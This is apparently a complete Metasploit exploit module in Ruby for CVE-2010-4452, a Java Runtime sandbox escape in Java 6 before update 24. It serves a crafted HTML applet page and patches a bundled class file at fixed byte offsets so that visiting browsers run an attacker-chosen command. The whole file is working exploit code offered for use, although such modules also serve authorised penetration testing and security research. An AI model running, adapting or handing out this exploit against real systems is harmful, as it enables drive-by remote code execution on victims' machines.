# $Id: java_codebase_trust.rb 11983 2011-03-16 05:01:29Z jduck $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize( info = {} )
        super( update_info( info,
            &#039;Name&#039;          => &#039;Sun Java Applet2ClassLoader Remote Code Execution Exploit&#039;,
            &#039;Description&#039;   => %q{
                    This module exploits a vulnerability in Java Runtime Environment
                that allows an attacker to escape the Java Sandbox. By supplying a
                codebase that points at a trusted directory and a code that is a URL that
                does not contain an dots an applet can run without the sandbox.
 
                The vulnerability affects version 6 prior to update 24.
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        => [
                    &#039;Frederic Hoguin&#039;, # Discovery, PoC
                    &#039;jduck&#039;            # Metasploit module
                ],
            &#039;Version&#039;       => &#039;$Revision: 11983 $&#039;,
            &#039;References&#039;    =>
                [
                    [ &#039;CVE&#039;, &#039;2010-4452&#039; ],
                    # [ &#039;OSVDB&#039;, &#039;&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-084/&#039; ],
                    [ &#039;URL&#039;, &#039;http://fhoguin.com/2011/03/oracle-java-unsigned-applet-applet2classloader-remote-code-execution-vulnerability-zdi-11-084-explained/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/javacpufeb2011-304611.html&#039; ]
                ],
            &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039; ],
            &#039;Payload&#039;       => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
            &#039;Targets&#039;       =>
                [
                    # OK on Windows x86 + IE + Sun Java 1.6.0u21,u22,u23
                    # FAIL on Ubuntu x86 + Firefox + Sun Java 1.6.0u23
                    [ &#039;Automatic (no payload)&#039;, { } ]
=begin
                    [ &#039;Windows x86&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;win&#039;,
                        }
                    ],
                    [ &#039;Generic (Java Payload)&#039;,
                        {
                            &#039;Arch&#039; => ARCH_JAVA,
                            &#039;Platform&#039; => &#039;java&#039;,
                        }
                    ],
=end
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Feb 15 2011&#039;
            ))
     
        register_options(
            [
                OptString.new(&#039;CMD&#039;, [ false,  "Command to run.", "calc.exe"]),
                OptString.new(&#039;LIBPATH&#039;, [ false,  "The codebase path to use (privileged)",
                    "C:\\Program Files\\java\\jre6\\lib\\ext"]),
            ], self.class)
    end
 
    def exploit
        path = [ Msf::Config.data_directory, "exploits", "cve-2010-4452", "AppletX.class" ].join(::File::SEPARATOR)
        @java_class = nil
        File.open(path, "rb") { |fd|
            @java_class = fd.read(fd.stat.size)
        }
        if not @java_class
            raise RuntimeError, "Unable to load java class"
        end
 
        super
    end
 
    def on_request_uri(cli, request)
        #print_status("Received request: #{request.uri}")
 
        jpath = get_uri(cli)
        #print_status(jpath)
 
        # Do what get_uri does so that we can replace it in the string
        host = Rex::Socket.source_address(cli.peerhost)
        host_num = Rex::Socket.addr_aton(host).unpack(&#039;N&#039;).first
 
        codebase = "file:" + datastore[&#039;LIBPATH&#039;]
        code_url = jpath.sub(host, host_num.to_s)
 
        cmd = datastore[&#039;CMD&#039;]
        cmd_off = 0xb4
 
        cn_off = 0xfc
 
        case request.uri
 
        when /\.class$/
            #p = regenerate_payload(cli)
 
            print_status("Sending class file to #{cli.peerhost}:#{cli.peerport}...")
 
            cls = @java_class.dup
            cls[cmd_off,2] = [cmd.length].pack(&#039;n&#039;)
            cls[cmd_off+2,8] = cmd
 
            cn_off += (cmd.length - 8)  # the original length was 8 (calc.exe)
            cls[cn_off,2] = [code_url.length].pack(&#039;n&#039;)
            cls[cn_off+2,7] = code_url
 
            #File.open(&#039;ughz.class&#039;, &#039;wb&#039;) { |fd| fd.write cls }
 
            send_response(cli, cls, { &#039;Content-Type&#039; => "application/octet-stream" })
            handler(cli)
 
        else
            html = <<-EOS
<html>
<body>
<applet codebase="#{codebase}" code="#{code_url}" />
</body>
</html>
EOS
            print_status("Sending HTML file to #{cli.peerhost}:#{cli.peerport}...")
            send_response_html(cli, html)
            handler(cli)
        end
 
    end
 
end



